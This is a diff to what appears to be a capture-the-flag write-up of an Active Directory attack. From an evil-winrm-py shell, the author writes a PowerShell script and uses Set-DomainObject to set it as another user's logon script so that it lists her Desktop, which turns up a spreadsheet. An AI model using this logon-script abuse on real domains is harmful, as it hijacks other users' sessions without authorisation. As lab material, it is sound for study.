@@ -325,7 +325,7 @@ Ive applied an SPN but the hash wont crack and i dont think PKINIT is supported 
 I can also try abusing things like logon scripts
 
 ```python
-evil-winrm-py PS C:\ProgramData> echo "dir C:\Users\maria\Desktop\ > C:\ProgramData\desktop" > desktop.ps1
+evil-winrm-py PS C:\ProgramData> echo "dir C:\Users\maria\Desktop\ > C:\ProgramData\desktop.txt" > desktop.ps1
 ```
 
 Ill make a file that takes whats in her desktop and and saves it to a file
@@ -336,3 +336,25 @@ evil-winrm-py PS C:\programdata> Set-DomainObject maria -Set @{'scriptpath'='C:\
 
 Then ill set my script as her logon script that should hopefully run
 
+```python
+
+
+evil-winrm-py PS C:\ProgramData> type desktop.txt
+
+
+    Directory: C:\Users\maria\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/26/2021   8:13 AM           6144 Engines.xls                                                           
+
+
+evil-winrm-py PS C:\ProgramData>
+```
+
+There is a spreadsheet there
+
+```python
+
+```
